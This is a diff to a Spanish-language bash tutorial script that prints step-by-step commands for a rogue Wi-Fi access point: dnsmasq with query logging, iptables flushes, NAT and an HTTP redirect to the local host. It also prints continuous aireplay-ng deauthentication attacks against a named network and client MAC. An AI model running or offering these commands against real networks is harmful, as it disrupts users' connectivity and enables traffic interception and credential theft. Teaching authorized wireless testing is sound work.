@@ -102,17 +102,32 @@ explain_dns_ip() {
     printf "|      🌐 Configuración de DNS y DHCP           |\n"
     printf "==================================================\033[0m\n"
 
-    printf "\n🔹 \033[1;33mPaso 1: Configurar dnsmasq\033[0m\n"
-    printf "  📌 Comando: \033[1;32mnano /etc/dnsmasq.conf\033[0m\n"
-    printf "  ➜ Edita el archivo para definir rangos de IP y servidores DNS.\n"
+printf "\n🔹 \033[1;33mPaso 1: Editar archivo de configuración de dnsmasq\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo nano /etc/dnsmasq.conf\033[0m\n"
 
-    printf "\n🔹 \033[1;33mPaso 2: Asignar IP a la interfaz\033[0m\n"
-    printf "  📌 Comando: \033[1;32mifconfig at0 192.168.2.1 netmask 255.255.255.0 up\033[0m\n"
-    printf "  ➜ Establece la dirección IP para la interfaz virtual at0.\n"
+    printf "\n🔹 \033[1;33mPaso 2: Configurar interfaz at0\033[0m\n"
+    printf "  📌 Comando: \033[1;32minterface=at0\033[0m\n"
+    printf "  Configura dnsmasq para escuchar en la interfaz virtual `at0`.\n"
 
-    printf "\n🔹 \033[1;33mPaso 3: Activar reenvío de tráfico\033[0m\n"
-    printf "  📌 Comando: \033[1;32mecho 1 > /proc/sys/net/ipv4/ip_forward\033[0m\n"
-    printf "  ➜ Permite compartir la conexión entre interfaces.\n"
+    printf "\n🔹 \033[1;33mPaso 3: Configurar rango DHCP\033[0m\n"
+    printf "  📌 Comando: \033[1;32mdhcp-range=192.168.2.130,192.168.2.254,12h\033[0m\n"
+    printf "  Define el rango de direcciones IP que `dnsmasq` asignará a los clientes, con un tiempo de arrendamiento de 12 horas.\n"
+
+    printf "\n🔹 \033[1;33mPaso 4: Configurar la puerta de enlace (Gateway)\033[0m\n"
+    printf "  📌 Comando: \033[1;32mdhcp-option=3,192.168.2.129\033[0m\n"
+    printf "  Define la dirección IP de la puerta de enlace para los clientes DHCP.\n"
+
+    printf "\n🔹 \033[1;33mPaso 5: Configurar DNS de Google\033[0m\n"
+    printf "  📌 Comando: \033[1;32mdhcp-option=6,8.8.8.8,8.8.4.4\033[0m\n"
+    printf "  Define los servidores DNS (en este caso, los DNS públicos de Google) que los clientes utilizarán.\n"
+
+    printf "\n🔹 \033[1;33mPaso 6: Habilitar el registro de consultas DNS\033[0m\n"
+    printf "  📌 Comando: \033[1;32mlog-queries\033[0m\n"
+    printf "  Habilita el registro de todas las consultas DNS que realicen los clientes.\n"
+
+    printf "\n🔹 \033[1;33mPaso 7: Habilitar el registro de asignaciones DHCP\033[0m\n"
+    printf "  📌 Comando: \033[1;32mlog-dhcp\033[0m\n"
+    printf "  Habilita el registro de todas las asignaciones de direcciones DHCP.\n"
 
     printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
     read -r
@@ -134,6 +149,34 @@ explain_interface() {
     printf "\n🔹 \033[1;33mPaso 3: Habilitar reenvío de paquetes\033[0m\n"
     printf "  📌 Comando: \033[1;32mecho 1 | tee /proc/sys/net/ipv4/ip_forward\033[0m\n"
 
+    printf "\n🔹 \033[1;33mPaso 4: Limpiar reglas de firewall\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo iptables --flush\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 5: Limpiar reglas NAT\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo iptables --table nat --flush\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 6: Eliminar cadenas personalizadas\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo iptables --delete-chain\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 7: Eliminar cadenas personalizadas en NAT\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo iptables --table nat --delete-chain\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 8: Configurar NAT y enmascarado\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 9: Permitir forwarding de tráfico\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo iptables --append FORWARD --in-interface at0 -j ACCEPT\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 10: Redirigir tráfico HTTP a la IP interna\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 11: Enmascarar tráfico de salida\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo iptables -t nat -A POSTROUTING -j MASQUERADE\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 12: Iniciar dnsmasq\033[0m\n"
+    printf "  📌 Comando: \033[1;32msudo dnsmasq -C /etc/dnsmasq.conf\033[0m\n"
+
+
     printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
     read -r
 }
@@ -145,14 +188,26 @@ explain_deauth() {
     printf "|      🛑 Envío de Paquetes de Desautenticación |\n"
     printf "==================================================\033[0m\n"
 
-    printf "\n🔹 \033[1;33mPaso 1: Poner la interfaz en modo monitor\033[0m\n"
+    printf "\n🔹 \033[1;33mPaso 1: Iniciar modo monitor en la interfaz wlan0\033[0m\n"
     printf "  📌 Comando: \033[1;32mairmon-ng start wlan0\033[0m\n"
 
-    printf "\n🔹 \033[1;33mPaso 2: Capturar tráfico en la red\033[0m\n"
-    printf "  📌 Comando: \033[1;32mairodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 wlan0mon\033[0m\n"
+    printf "\n🔹 \033[1;33mPaso 2: Verificar procesos que pueden interferir y matarlos\033[0m\n"
+    printf "  📌 Comando: \033[1;32mairmon-ng check kill\033[0m\n"
 
-    printf "\n🔹 \033[1;33mPaso 3: Enviar paquetes de desautenticación\033[0m\n"
-    printf "  📌 Comando: \033[1;32maireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon\033[0m\n"
+    printf "\n🔹 \033[1;33mPaso 3: Volver a iniciar el modo monitor en wlan0\033[0m\n"
+    printf "  📌 Comando: \033[1;32mairmon-ng start wlan0\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 4: Capturar paquetes y buscar redes\033[0m\n"
+    printf "  📌 Comando: \033[1;32mairodump-ng wlan0\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 5: Filtrar una red específica con su BSSID y canal\033[0m\n"
+    printf "  📌 Comando: \033[1;32mairodump-ng --bssid 64:58:AD:38:B3:1E -c 11 --essid Angel.Red wlan0\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 6: Realizar ataque de desautenticación (sin especificar cliente)\033[0m\n"
+    printf "  📌 Comando: \033[1;32maireplay-ng -0 0 -a 64:58:AD:38:B3:1E wlan0\033[0m\n"
+
+    printf "\n🔹 \033[1;33mPaso 7: Realizar ataque de desautenticación contra un cliente específico\033[0m\n"
+    printf "  📌 Comando: \033[1;32maireplay-ng -0 0 -a 64:58:AD:38:B3:1E -c 62:0E:1C:D1:1D:69 wlan0\033[0m\n"
 
     printf "\n⚠️ \033[1;31mAdvertencia:\033[0m Solo para pruebas de seguridad autorizadas.\n"
     printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
